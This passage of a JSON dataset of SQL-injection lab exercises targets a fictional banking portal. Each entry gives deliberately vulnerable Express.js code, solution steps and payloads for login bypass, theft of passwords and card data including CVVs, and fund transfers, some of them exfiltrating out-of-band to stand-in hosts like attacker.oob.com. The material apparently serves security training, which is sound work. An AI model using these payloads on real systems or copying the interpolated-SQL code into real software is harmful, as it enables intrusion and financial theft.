    "srcCode": "app.post('/loan/calculate', (req, res) => {\n  const loanAmount = req.body.amount;\n  const loanTerm = req.body.term;\n  const sql = `SELECT * FROM loan_calculations WHERE amount = '${loanAmount}' AND term = '${loanTerm}'`;\n  db.query(sql, (err, result) => {\n    if (err) res.status(500).send('Loan calculation failed');\n    else res.json(result[0]);\n  });\n});",
    "payloads": [
      "'; SELECT LOAD_FILE(CONCAT('\\\\',(SELECT interest_rate FROM loan_calculations WHERE amount='5000'),'.oob.bank.com\\\\'))--",
      "' UNION SELECT 1 INTO OUTFILE '\\\\\\\\attacker.oob.com\\\\loan_interest_data'--"
    ]
  },
  {
    "Lab scenario": "Banking Portal - SQL Injection in Account Login",
    "Lab Description": "The login page of the banking portal is vulnerable to SQL Injection due to improper handling of user credentials in the SQL query. Attackers can inject payloads into the username and password fields to retrieve sensitive account details or bypass authentication entirely using UNION-based injection. The task is to exploit this vulnerability to exfiltrate account details.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Use a proxy tool (Burp Suite or OWASP ZAP) to intercept the login request.",
      "Inject a SQL payload into the username or password field.",
      "Leverage UNION-based SQL Injection to retrieve account details or bypass login.",
      "Verify the exfiltrated data (e.g., account numbers, passwords)."
    ],
    "Vulnerability name": "SQL Injection",
    "srcCode": "app.post('/login', (req, res) => {\n  const username = req.body.username;\n  const password = req.body.password;\n  const sql = `SELECT * FROM users WHERE username = '${username}' AND password = '${password}'`;\n  db.query(sql, (err, result) => {\n    if (err) res.status(500).send('Login failed');\n    else res.json(result[0]);\n  });\n});",
    "payloads": [
      "' UNION SELECT username, password FROM users --",
      "' OR 1=1 --"
    ]
  },
  {
    "Lab scenario": "Banking Portal - SQL Injection in Account Transfer",
    "Lab Description": "The banking portal\u00e2\u20ac\u2122s account transfer feature is vulnerable to SQL Injection. An attacker can inject malicious SQL code into the transfer amount or recipient account number fields. This vulnerability allows an attacker to steal funds or leak account information. The goal is to craft a payload that exfiltrates transfer data via OOB DNS requests.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Set up an OOB DNS listener (Burp Collaborator).",
      "Inject SQL payloads into the transfer amount and recipient account number fields.",
      "Monitor DNS traffic for exfiltrated data about the transfer (e.g., account numbers, amounts).",
      "Verify successful data leakage via OOB."
    ],
    "Vulnerability name": "SQL Injection",
    "srcCode": "app.post('/transfer', (req, res) => {\n  const amount = req.body.amount;\n  const recipient = req.body.recipient;\n  const sql = `INSERT INTO transfers (amount, recipient) VALUES ('${amount}', '${recipient}')`;\n  db.query(sql, (err, result) => {\n    if (err) res.status(500).send('Transfer failed');\n    else res.json({ success: true });\n  });\n});",
    "payloads": [
      "'; SELECT LOAD_FILE(CONCAT('\\\\',(SELECT amount FROM transfers WHERE recipient='12345'),'.oob.bank.com\\\\'))--",
      "' UNION SELECT 1 INTO OUTFILE '\\\\\\\\attacker.oob.com\\\\transfer_data'--"
    ]
  },
  {
    "Lab scenario": "Banking API - SQL Injection in Account Info API",
    "Lab Description": "The banking API has an endpoint that retrieves user account information, but fails to sanitize inputs. An attacker can inject SQL payloads into the account number field, leading to SQL Injection vulnerabilities. The goal is to exfiltrate sensitive account information, such as balance and transaction history, using OOB DNS exfiltration.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Set up an OOB DNS listener (Burp Collaborator).",
      "Inject a crafted SQL payload into the account number field.",
      "Monitor DNS traffic for the exfiltration of sensitive account data (e.g., balance, transactions).",
      "Verify the successful leak of account information."
    ],
    "Vulnerability name": "SQL Injection",
    "srcCode": "app.get('/account/info', (req, res) => {\n  const accountNumber = req.query.accountNumber;\n  const sql = `SELECT * FROM accounts WHERE account_number = '${accountNumber}'`;\n  db.query(sql, (err, result) => {\n    if (err) res.status(500).send('Account info fetch failed');\n    else res.json(result[0]);\n  });\n});",
    "payloads": [
      "'; SELECT LOAD_FILE(CONCAT('\\\\',(SELECT balance FROM accounts WHERE account_number='12345'),'.oob.bank.com\\\\'))--",
      "' UNION SELECT 1 INTO OUTFILE '\\\\\\\\attacker.oob.com\\\\account_info'--"
    ]
  },
  {
    "Lab scenario": "Banking Portal - SQL Injection in Transaction History",
    "Lab Description": "The banking portal has an endpoint that displays a user\u00e2\u20ac\u2122s transaction history based on the user ID. The endpoint is vulnerable to SQL Injection due to improper sanitization of input. An attacker can inject SQL payloads into the user ID parameter to extract sensitive transaction details. The goal is to craft an injection that exfiltrates the entire transaction history of a target account via OOB DNS.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Intercept the request using Burp Suite or OWASP ZAP.",
      "Inject a SQL payload into the user ID parameter to bypass the query logic.",
      "Monitor the DNS exfiltration for leaked transaction details.",
      "Verify the exfiltrated transaction data."
    ],
    "Vulnerability name": "SQL Injection",
    "srcCode": "app.get('/account/transactions', (req, res) => {\n  const userId = req.query.userId;\n  const sql = `SELECT * FROM transactions WHERE user_id = '${userId}'`;\n  db.query(sql, (err, result) => {\n    if (err) res.status(500).send('Transaction history fetch failed');\n    else res.json(result);\n  });\n});",
    "payloads": [
      "' UNION SELECT username, transaction_amount FROM transactions --",
      "'; SELECT LOAD_FILE(CONCAT('\\\\',(SELECT transaction_details FROM transactions WHERE user_id='1'),'.oob.bank.com\\\\'))--"
    ]
  },
  {
    "Lab scenario": "Banking Portal - SQL Injection in User Profile Update",
    "Lab Description": "The profile update form in the banking portal is vulnerable to SQL Injection due to improper input sanitization. The form accepts user inputs like address, phone number, and email, which are directly inserted into a SQL query without sanitization. The goal is to exploit the SQL Injection vulnerability to modify other user profiles or retrieve sensitive data.",
    "Difficulty Level": "Easy",
    "Solution Steps": [
      "Use Burp Suite to intercept the request for profile update.",
      "Inject a simple SQL payload in the phone number or address fields.",
      "Modify the request to retrieve other users\u00e2\u20ac\u2122 profile data using UNION SELECT.",
      "Verify the successful exfiltration or modification of profile data."
    ],
    "Vulnerability name": "SQL Injection",
    "srcCode": "app.post('/profile/update', (req, res) => {\n  const userId = req.body.userId;\n  const address = req.body.address;\n  const sql = `UPDATE users SET address = '${address}' WHERE user_id = '${userId}'`;\n  db.query(sql, (err, result) => {\n    if (err) res.status(500).send('Profile update failed');\n    else res.json({ success: true });\n  });\n});",
    "payloads": [
      "' OR 1=1 --",
      "'; UPDATE users SET address = 'Hacked Address' WHERE user_id = '1' --"
    ]
  },
  {
    "Lab scenario": "Banking API - SQL Injection in Fund Transfer API",
    "Lab Description": "The API endpoint responsible for fund transfers is vulnerable to SQL Injection. An attacker can manipulate the source account number and transfer amount parameters in the URL query string to exfiltrate sensitive data or steal funds. The goal is to exploit this vulnerability to steal funds or retrieve sensitive user information.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Intercept the API request using Postman or Burp Suite.",
      "Inject a SQL payload into the source account or amount fields.",
      "Leverage UNION-based SQL Injection to retrieve user data or perform unauthorized fund transfers.",
      "Verify the successful exfiltration or unauthorized transaction."
    ],
    "Vulnerability name": "SQL Injection",
    "srcCode": "app.post('/api/transfer', (req, res) => {\n  const sourceAccount = req.body.sourceAccount;\n  const destinationAccount = req.body.destinationAccount;\n  const amount = req.body.amount;\n  const sql = `INSERT INTO transfers (source_account, destination_account, amount) VALUES ('${sourceAccount}', '${destinationAccount}', '${amount}')`;\n  db.query(sql, (err, result) => {\n    if (err) res.status(500).send('Transfer failed');\n    else res.json({ success: true });\n  });\n});",
    "payloads": [
      "' UNION SELECT account_number, balance FROM users --",
      "' OR 1=1 --"
    ]
  },
  {
    "Lab scenario": "Banking Portal - SQL Injection in Fund Withdrawal",
    "Lab Description": "The banking portal is vulnerable to SQL Injection in the withdrawal form. The withdrawal amount and account number fields are susceptible to SQL injection, allowing an attacker to exfiltrate account details or modify the withdrawal amount. The goal is to inject a payload that either exfiltrates sensitive information or authorizes a withdrawal from a target account.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Use Burp Suite to intercept the withdrawal form submission.",
      "Inject a SQL payload in the amount or account number fields.",
      "Test the payloads for data exfiltration or withdrawal approval.",
      "Verify the exfiltrated data or unauthorized withdrawal."
    ],
    "Vulnerability name": "SQL Injection",
    "srcCode": "app.post('/withdraw', (req, res) => {\n  const accountNumber = req.body.accountNumber;\n  const amount = req.body.amount;\n  const sql = `INSERT INTO withdrawals (account_number, amount) VALUES ('${accountNumber}', '${amount}')`;\n  db.query(sql, (err, result) => {\n    if (err) res.status(500).send('Withdrawal failed');\n    else res.json({ success: true });\n  });\n});",
    "payloads": [
      "'; SELECT LOAD_FILE(CONCAT('\\\\',(SELECT account_details FROM accounts WHERE account_number='12345'),'.oob.bank.com\\\\'))--",
      "' UNION SELECT 1 INTO OUTFILE '\\\\\\\\attacker.oob.com\\\\withdrawal_data'--"
    ]
  },
  {
    "Lab scenario": "Banking Portal - SQL Injection in Credit Card Payment",
    "Lab Description": "The payment form on the banking portal is vulnerable to SQL Injection. An attacker can inject SQL payloads into the credit card number field or payment amount field to retrieve sensitive credit card details or bypass payment authentication. The goal is to extract sensitive credit card data using SQL Injection.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Use Burp Suite to intercept the payment form request.",
      "Inject SQL payloads into the credit card number or amount fields.",
      "Leverage UNION-based SQL Injection to extract credit card details.",
      "Verify the successful exfiltration of sensitive credit card information."
    ],
    "Vulnerability name": "SQL Injection",
    "srcCode": "app.post('/payment', (req, res) => {\n  const cardNumber = req.body.cardNumber;\n  const amount = req.body.amount;\n  const sql = `INSERT INTO payments (card_number, amount) VALUES ('${cardNumber}', '${amount}')`;\n  db.query(sql, (err, result) => {\n    if (err) res.status(500).send('Payment failed');\n    else res.json({ success: true });\n  });\n});",
    "payloads": [
      "' UNION SELECT card_number, expiration_date FROM credit_cards --",
      "'; SELECT LOAD_FILE(CONCAT('\\\\',(SELECT card_number FROM credit_cards WHERE card_id='1'),'.oob.bank.com\\\\'))--"
    ]
  },
  {
    "Lab scenario": "Banking Portal - SQL Injection in Balance Check API",
    "Lab Description": "The balance check API endpoint is vulnerable to SQL Injection. The user ID parameter is directly passed into the SQL query without proper sanitization. This vulnerability allows attackers to extract sensitive account balance information for any user. The goal is to inject SQL payloads that allow exfiltration of account balance data for multiple users.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Use Burp Suite to intercept the request and locate the vulnerable user ID parameter.",
      "Inject SQL payloads into the user ID parameter to extract account balance data using UNION SELECT.",
      "Monitor the responses for any sensitive data leakage.",
      "Verify the successful extraction of account balances."
    ],
    "Vulnerability name": "SQL Injection",
    "srcCode": "app.get('/api/balance', (req, res) => {\n  const userId = req.query.userId;\n  const sql = `SELECT balance FROM accounts WHERE user_id = '${userId}'`;\n  db.query(sql, (err, result) => {\n    if (err) res.status(500).send('Balance retrieval failed');\n    else res.json(result);\n  });\n});",
    "payloads": [
      "' UNION SELECT user_id, balance FROM accounts --",
      "' OR 1=1 --"
    ]
  },
  {
    "Lab scenario": "Banking Portal - SQL Injection in Loan Application Form",
    "Lab Description": "The loan application form in the banking portal is vulnerable to SQL Injection. The application allows users to input their loan amount and account number. The lack of input validation allows attackers to inject malicious SQL queries into these fields. The goal is to extract personal information and account details of other users by injecting SQL payloads.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Use Burp Suite or OWASP ZAP to intercept the loan application request.",
      "Inject SQL payloads into the loan amount or account number fields.",
      "Test for data leakage or unauthorized access to user information using UNION SELECT.",
      "Verify the successful exfiltration of account and personal information."
    ],
    "Vulnerability name": "SQL Injection",
    "srcCode": "app.post('/apply-loan', (req, res) => {\n  const accountNumber = req.body.accountNumber;\n  const loanAmount = req.body.loanAmount;\n  const sql = `INSERT INTO loan_applications (account_number, loan_amount) VALUES ('${accountNumber}', '${loanAmount}')`;\n  db.query(sql, (err, result) => {\n    if (err) res.status(500).send('Loan application failed');\n    else res.json({ success: true });\n  });\n});",
    "payloads": [
      "' UNION SELECT account_number, first_name, last_name FROM users --",
      "'; SELECT LOAD_FILE(CONCAT('\\\\',(SELECT account_number FROM accounts WHERE loan_status='pending'),'\\\\oob.bank.com\\\\'))--"
    ]
  },
  {
    "Lab scenario": "Banking Portal - SQL Injection in Account Registration",
    "Lab Description": "The account registration form is vulnerable to SQL Injection due to improper sanitization of user inputs. The attacker can inject malicious SQL code into fields such as the username or email to bypass account creation logic and retrieve existing account information. The goal is to exfiltrate existing account information through SQL injection in the registration form.",
    "Difficulty Level": "Easy",
    "Solution Steps": [
      "Intercept the registration form submission using Burp Suite.",
      "Inject SQL payloads into the username or email fields.",
      "Use UNION SELECT to extract sensitive account information such as usernames and email addresses.",
      "Verify the successful data extraction."
    ],
    "Vulnerability name": "SQL Injection",
    "srcCode": "app.post('/register', (req, res) => {\n  const username = req.body.username;\n  const email = req.body.email;\n  const password = req.body.password;\n  const sql = `INSERT INTO users (username, email, password) VALUES ('${username}', '${email}', '${password}')`;\n  db.query(sql, (err, result) => {\n    if (err) res.status(500).send('Registration failed');\n    else res.json({ success: true });\n  });\n});",
    "payloads": [
      "' UNION SELECT username, email FROM users --",
      "' OR 1=1 --"
    ]
  },
  {
    "Lab scenario": "Banking Portal - SQL Injection in Transfer History",
    "Lab Description": "The transfer history page on the banking portal is vulnerable to SQL Injection. The page queries transfer records by user ID but does not properly sanitize the user input. An attacker can manipulate the user ID parameter to access another user\u00e2\u20ac\u2122s transfer history or exfiltrate data. The goal is to exploit this vulnerability to extract sensitive transfer information of other users.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Intercept the transfer history request using Burp Suite.",
      "Inject SQL payloads into the user ID parameter to retrieve transfer history.",
      "Use UNION SELECT to extract transfer records for other users.",
      "Verify the successful extraction of transfer history."
    ],
    "Vulnerability name": "SQL Injection",
    "srcCode": "app.get('/transfer-history', (req, res) => {\n  const userId = req.query.userId;\n  const sql = `SELECT * FROM transfers WHERE user_id = '${userId}'`;\n  db.query(sql, (err, result) => {\n    if (err) res.status(500).send('Transfer history retrieval failed');\n    else res.json(result);\n  });\n});",
    "payloads": [
      "' UNION SELECT transfer_id, amount, date FROM transfers --",
      "'; SELECT * FROM transfers WHERE user_id = '1' --"
    ]
  },
  {
    "Lab scenario": "Banking Portal - SQL Injection in Password Reset API",
    "Lab Description": "The password reset API is vulnerable to SQL Injection. An attacker can inject malicious SQL code into the email or username parameters, bypassing the intended password reset flow and extracting sensitive user data, such as email addresses and user names. The goal is to retrieve user data and potentially reset the passwords for targeted accounts.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Intercept the password reset request using Burp Suite or Postman.",
      "Inject SQL payloads into the email or username parameters.",
      "Leverage UNION SELECT to extract email addresses and usernames.",
      "Verify the successful data extraction or password reset."
    ],
    "Vulnerability name": "SQL Injection",
    "srcCode": "app.post('/reset-password', (req, res) => {\n  const email = req.body.email;\n  const sql = `SELECT * FROM users WHERE email = '${email}'`;\n  db.query(sql, (err, result) => {\n    if (err) res.status(500).send('Password reset failed');\n    else res.json(result);\n  });\n});",
    "payloads": [
      "' UNION SELECT email, username FROM users --",
      "' OR 1=1 --"
    ]
  },
  {
    "Lab scenario": "Banking Portal - SQL Injection in User Authentication",
    "Lab Description": "The login endpoint is vulnerable to SQL Injection. The application directly injects the username and password parameters into an SQL query without proper sanitization. This flaw allows attackers to bypass authentication by injecting SQL payloads. The goal is to exploit this vulnerability to log in as an admin user without valid credentials.",
    "Difficulty Level": "Easy",
    "Solution Steps": [
      "Use Burp Suite to intercept the login request and identify the vulnerable username and password fields.",
      "Inject SQL payloads into the username and password fields to bypass authentication.",
      "Test various payloads like ' OR '1'='1 to see if you can bypass authentication.",
      "Verify successful login with admin privileges."
    ],
    "Vulnerability name": "SQL Injection",
    "srcCode": "app.post('/login', (req, res) => {\n  const { username, password } = req.body;\n  const sql = `SELECT * FROM users WHERE username = '${username}' AND password = '${password}'`;\n  db.query(sql, (err, result) => {\n    if (err) res.status(500).send('Login failed');\n    else res.json(result);\n  });\n});",
    "payloads": [
      "' OR '1'='1' --",
      "' UNION SELECT 1, username, password FROM users --"
    ]
  },
  {
    "Lab scenario": "Banking Portal - SQL Injection in Transfer Money API",
    "Lab Description": "The transfer money API in the banking portal is vulnerable to SQL Injection. The amount and account number parameters are directly inserted into the SQL query, making it easy for attackers to manipulate the transaction logic. The goal is to transfer funds to an attacker-controlled account by injecting malicious SQL payloads into the amount or account number fields.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Intercept the transfer money request using Burp Suite.",
      "Inject SQL payloads into the amount and account number fields.",
      "Test if you can alter the transaction to transfer money to your own account using UNION SELECT.",
      "Verify successful fund transfer."
    ],
    "Vulnerability name": "SQL Injection",
    "srcCode": "app.post('/transfer', (req, res) => {\n  const { accountNumber, amount } = req.body;\n  const sql = `INSERT INTO transactions (account_number, amount) VALUES ('${accountNumber}', '${amount}')`;\n  db.query(sql, (err, result) => {\n    if (err) res.status(500).send('Transaction failed');\n    else res.json({ success: true });\n  });\n});",
    "payloads": [
      "'; INSERT INTO transactions (account_number, amount) VALUES ('attacker_account', 10000) --",
      "' UNION SELECT account_number, balance FROM accounts --"
    ]
  },
  {
    "Lab scenario": "Banking Portal - SQL Injection in User Settings",
    "Lab Description": "The user settings page allows users to update their personal details, but the application is vulnerable to SQL Injection. The settings API updates parameters like the user's email or phone number without sanitizing the input, allowing attackers to manipulate user data. The goal is to extract or modify sensitive user information, such as account numbers, by injecting SQL payloads.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Intercept the settings update request with Burp Suite.",
      "Inject SQL payloads into the email or phone number fields.",
      "Check for data leakage or unauthorized updates to sensitive fields, such as account number or balance.",
      "Verify the data manipulation or exfiltration success."
    ],
    "Vulnerability name": "SQL Injection",
    "srcCode": "app.post('/update-settings', (req, res) => {\n  const { email, phone } = req.body;\n  const sql = `UPDATE users SET email = '${email}', phone = '${phone}' WHERE user_id = '${req.userId}'`;\n  db.query(sql, (err, result) => {\n    if (err) res.status(500).send('Update failed');\n    else res.json({ success: true });\n  });\n});",
    "payloads": [
      "' UNION SELECT email, phone FROM users --",
      "'; UPDATE users SET phone = 'attacker_phone' WHERE user_id = '1' --"
    ]
  },
  {
    "Lab scenario": "Banking Portal - SQL Injection in Admin Dashboard",
    "Lab Description": "The admin dashboard is vulnerable to SQL Injection through a search field used to find transactions by user ID. The application does not validate user inputs, making it possible to inject SQL code into the search query. The goal is to bypass authentication and access sensitive transaction records for any user through SQL injection.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Use Burp Suite to intercept the search request and identify the user ID parameter.",
      "Inject SQL payloads into the user ID field to extract sensitive transaction records.",
      "Test the payloads like ' UNION SELECT * FROM transactions --' to bypass access control.",
      "Verify the extraction of sensitive transaction information."
    ],
    "Vulnerability name": "SQL Injection",
    "srcCode": "app.get('/admin/search', (req, res) => {\n  const { userId } = req.query;\n  const sql = `SELECT * FROM transactions WHERE user_id = '${userId}'`;\n  db.query(sql, (err, result) => {\n    if (err) res.status(500).send('Search failed');\n    else res.json(result);\n  });\n});",
    "payloads": [
      "' UNION SELECT user_id, transaction_id, amount FROM transactions --",
      "' OR 1=1 --"
    ]
  },
  {
    "Lab scenario": "Banking Portal - SQL Injection in Transaction Status Check",
    "Lab Description": "The transaction status check API is vulnerable to SQL Injection. An attacker can exploit the lack of sanitization in the transaction ID parameter to exfiltrate transaction details from the database. The goal is to use SQL Injection to retrieve the status and details of multiple transactions by injecting malicious payloads.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Intercept the status check request with Burp Suite and locate the vulnerable transaction ID parameter.",
      "Inject SQL payloads into the transaction ID parameter to extract sensitive data from the database.",
      "Use UNION SELECT to retrieve information from the transactions table.",
      "Verify the successful exfiltration of transaction details."
    ],
    "Vulnerability name": "SQL Injection",
    "srcCode": "app.get('/transaction-status', (req, res) => {\n  const { transactionId } = req.query;\n  const sql = `SELECT * FROM transactions WHERE transaction_id = '${transactionId}'`;\n  db.query(sql, (err, result) => {\n    if (err) res.status(500).send('Transaction status retrieval failed');\n    else res.json(result);\n  });\n});",
    "payloads": [
      "' UNION SELECT transaction_id, amount, status FROM transactions --",
      "'; SELECT * FROM transactions WHERE transaction_id = '1' --"
    ]
  },
  {
    "Lab scenario": "Banking Portal - SQL Injection in Transaction Search",
    "Lab Description": "The transaction search feature is vulnerable to SQL Injection. The search field does not properly sanitize the transaction ID parameter. Attackers can use this vulnerability to extract transaction records from the database. The goal is to use SQL injection to retrieve all transactions made by any user, including sensitive details like account numbers and balances.",
    "Difficulty Level": "Easy",
    "Solution Steps": [
      "Use Burp Suite to intercept the search request and identify the vulnerable transaction ID parameter.",
      "Inject SQL payloads like ' OR 1=1 to test for vulnerability.",
      "Use UNION SELECT to fetch multiple columns, including sensitive transaction data.",
      "Verify the successful retrieval of multiple transaction records."
    ],
    "Vulnerability name": "SQL Injection",
    "srcCode": "app.get('/transaction-search', (req, res) => {\n  const { transactionId } = req.query;\n  const sql = `SELECT * FROM transactions WHERE transaction_id = '${transactionId}'`;\n  db.query(sql, (err, result) => {\n    if (err) res.status(500).send('Search failed');\n    else res.json(result);\n  });\n});",
    "payloads": [
      "' OR 1=1 --",
      "' UNION SELECT transaction_id, account_number, amount FROM transactions --"
    ]
  },
  {
    "Lab scenario": "Banking Portal - SQL Injection in Account Balance Check",
    "Lab Description": "The account balance check feature in the banking portal is vulnerable to SQL Injection. The parameter used to retrieve the balance is not properly sanitized, allowing attackers to inject SQL payloads. The goal is to retrieve the balance of any user and modify it by injecting malicious SQL commands.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Intercept the balance check request with Burp Suite and identify the vulnerable account number field.",
      "Inject SQL payloads such as ' OR 1=1 to retrieve all user balances.",
      "Use UNION SELECT to query sensitive data such as account numbers and balances.",
      "Verify successful data exfiltration and balance modification."
    ],
    "Vulnerability name": "SQL Injection",
    "srcCode": "app.get('/account-balance', (req, res) => {\n  const { accountNumber } = req.query;\n  const sql = `SELECT balance FROM accounts WHERE account_number = '${accountNumber}'`;\n  db.query(sql, (err, result) => {\n    if (err) res.status(500).send('Balance retrieval failed');\n    else res.json(result);\n  });\n});",
    "payloads": [
      "' OR 1=1 --",
      "' UNION SELECT account_number, balance FROM accounts --"
    ]
  },
  {
    "Lab scenario": "Banking Portal - SQL Injection in Funds Transfer Page",
    "Lab Description": "The funds transfer page in the banking portal has a SQL Injection vulnerability. The page allows users to transfer funds, but the application directly inserts the amount and recipient account number into the SQL query. Attackers can inject SQL payloads to redirect funds to an attacker-controlled account. The goal is to manipulate the transaction to steal funds.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Intercept the transfer request with Burp Suite and identify the vulnerable account number and amount fields.",
      "Inject SQL payloads such as UNION SELECT to redirect funds to the attacker's account.",
      "Test using payloads like '; UPDATE accounts SET balance = balance - 1000 WHERE account_number = 'attacker_account' --",
      "Verify the success of the fund transfer and subsequent balance check."
    ],
    "Vulnerability name": "SQL Injection",
    "srcCode": "app.post('/transfer', (req, res) => {\n  const { fromAccount, toAccount, amount } = req.body;\n  const sql = `INSERT INTO transactions (from_account, to_account, amount) VALUES ('${fromAccount}', '${toAccount}', '${amount}')`;\n  db.query(sql, (err, result) => {\n    if (err) res.status(500).send('Transfer failed');\n    else res.json({ success: true });\n  });\n});",
    "payloads": [
      "'; UPDATE accounts SET balance = balance - 1000 WHERE account_number = 'attacker_account' --",
      "' UNION SELECT account_number, balance FROM accounts --"
    ]
  },
  {
    "Lab scenario": "Banking Portal - SQL Injection in Admin View of User Accounts",
    "Lab Description": "The admin view that lists user accounts is vulnerable to SQL Injection. The admin can search for user accounts by name or ID, but this functionality is not properly sanitized. Attackers can inject SQL payloads into the search field to extract all user details, including account numbers, transaction history, and balances.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Intercept the search request with Burp Suite and identify the user ID or name parameter.",
      "Inject SQL payloads like ' UNION SELECT * FROM users -- to retrieve user data.",
      "Check for the exposure of sensitive information like account balances and transaction history.",
      "Verify the extraction of sensitive user account details."
    ],
    "Vulnerability name": "SQL Injection",
    "srcCode": "app.get('/admin/users', (req, res) => {\n  const { userId } = req.query;\n  const sql = `SELECT * FROM users WHERE user_id = '${userId}'`;\n  db.query(sql, (err, result) => {\n    if (err) res.status(500).send('Search failed');\n    else res.json(result);\n  });\n});",
    "payloads": [
      "' UNION SELECT user_id, username, balance FROM users --",
      "' OR 1=1 --"
    ]
  },
  {
    "Lab scenario": "Banking Portal - SQL Injection in Loan Approval API",
    "Lab Description": "The loan approval API in the banking portal is vulnerable to SQL Injection. The API accepts user inputs like loan amount and ID without proper input validation, allowing attackers to inject SQL payloads. The goal is to manipulate the approval process and grant loans to unauthorized accounts by injecting malicious SQL commands.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Intercept the loan approval request with Burp Suite and identify the loan amount and user ID parameters.",
      "Inject SQL payloads to manipulate the loan approval process and bypass authorization checks.",
      "Test payloads such as ' OR 1=1 -- to approve loans without proper validation.",
      "Verify the successful approval of loans and extraction of loan details."
    ],
    "Vulnerability name": "SQL Injection",
    "srcCode": "app.post('/approve-loan', (req, res) => {\n  const { userId, amount } = req.body;\n  const sql = `INSERT INTO loans (user_id, amount) VALUES ('${userId}', '${amount}')`;\n  db.query(sql, (err, result) => {\n    if (err) res.status(500).send('Loan approval failed');\n    else res.json({ success: true });\n  });\n});",
    "payloads": [
      "' OR 1=1 --",
      "' UNION SELECT user_id, amount FROM loans --"
    ]
  },
  {
    "Lab scenario": "Banking Portal - SQL Injection in Fund Transfer History",
    "Lab Description": "The fund transfer history page is vulnerable to SQL Injection. The page retrieves the transfer records of a user based on the user ID parameter, which is not properly sanitized. Attackers can exploit this vulnerability to list all users' transfer records and even inject commands to alter the displayed data.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Use Burp Suite to intercept the request to the transfer history page and identify the vulnerable user ID parameter.",
      "Inject SQL payloads such as ' OR 1=1 -- to test for vulnerability.",
      "Use UNION SELECT to fetch multiple columns from the transfer records table.",
      "Verify the successful extraction of multiple transfer records."
    ],
    "Vulnerability name": "SQL Injection",
    "srcCode": "app.get('/transfer-history', (req, res) => {\n  const { userId } = req.query;\n  const sql = `SELECT * FROM transfers WHERE user_id = '${userId}'`;\n  db.query(sql, (err, result) => {\n    if (err) res.status(500).send('Failed to retrieve transfers');\n    else res.json(result);\n  });\n});",
    "payloads": [
      "' OR 1=1 --",
      "' UNION SELECT user_id, amount, date FROM transfers --"
    ]
  },
  {
    "Lab scenario": "Banking Portal - SQL Injection in Credit Card Info Retrieval",
    "Lab Description": "The credit card information retrieval feature is vulnerable to SQL Injection. The application retrieves credit card details based on the card number provided by the user. Attackers can inject SQL payloads into the card number field to retrieve all credit card information stored in the database.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Intercept the request with Burp Suite and identify the vulnerable card number field.",
      "Inject SQL payloads such as ' UNION SELECT * FROM credit_cards -- to test for vulnerability.",
      "Verify the successful retrieval of credit card information by using SQL injection.",
      "Clean up by obfuscating the payload to avoid detection."
    ],
    "Vulnerability name": "SQL Injection",
    "srcCode": "app.get('/credit-card-info', (req, res) => {\n  const { cardNumber } = req.query;\n  const sql = `SELECT * FROM credit_cards WHERE card_number = '${cardNumber}'`;\n  db.query(sql, (err, result) => {\n    if (err) res.status(500).send('Failed to retrieve card info');\n    else res.json(result);\n  });\n});",
    "payloads": [
      "' UNION SELECT card_number, expiry_date, cvv FROM credit_cards --",
      "' OR 1=1 --"
    ]
  },
  {
    "Lab scenario": "Banking Portal - SQL Injection in User Profile Update",
    "Lab Description": "The user profile update page is vulnerable to SQL Injection. Users can update their profile information, but the application fails to properly validate the input fields. Attackers can inject SQL payloads into these fields to manipulate their profile or even gain unauthorized access to other users' profiles.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Use Burp Suite to intercept the profile update request and identify the user ID and profile fields.",
      "Inject SQL payloads such as ' OR 1=1 -- to retrieve other user profiles.",
      "Use UNION SELECT to query the profiles table and access unauthorized user data.",
      "Verify the successful retrieval and update of profile data."
    ],
    "Vulnerability name": "SQL Injection",
    "srcCode": "app.post('/update-profile', (req, res) => {\n  const { userId, name, email } = req.body;\n  const sql = `UPDATE users SET name = '${name}', email = '${email}' WHERE user_id = '${userId}'`;\n  db.query(sql, (err, result) => {\n    if (err) res.status(500).send('Profile update failed');\n    else res.json({ success: true });\n  });\n});",
    "payloads": [
      "' OR 1=1 --",
      "' UNION SELECT user_id, name, email FROM users --"
    ]
  },
  {
    "Lab scenario": "Banking Portal - SQL Injection in Admin Panel",
    "Lab Description": "The admin panel for managing users is vulnerable to SQL Injection. Admins can search for users by ID or name, but the search functionality does not sanitize inputs. Attackers can use this to extract all user data, including account numbers, balances, and transaction histories.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Intercept the admin search request with Burp Suite and identify the vulnerable search field.",
      "Inject SQL payloads like ' UNION SELECT user_id, username, balance FROM users -- to extract user data.",
      "Test different payloads to verify the success of data extraction.",
      "Verify the successful enumeration of user accounts and sensitive data retrieval."
    ],
    "Vulnerability name": "SQL Injection",
    "srcCode": "app.get('/admin/search-users', (req, res) => {\n  const { userId } = req.query;\n  const sql = `SELECT * FROM users WHERE user_id = '${userId}'`;\n  db.query(sql, (err, result) => {\n    if (err) res.status(500).send('Search failed');\n    else res.json(result);\n  });\n});",
    "payloads": [
      "' UNION SELECT user_id, username, balance FROM users --",
      "' OR 1=1 --"
    ]
  },
  {
    "Lab scenario": "Banking Portal - SQL Injection in Loan Application Form",
    "Lab Description": "The loan application form is vulnerable to SQL Injection. The form collects user details such as loan amount and personal information, but the application fails to validate these inputs properly. Attackers can inject SQL payloads to manipulate the loan process, allowing them to apply for loans without proper validation.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
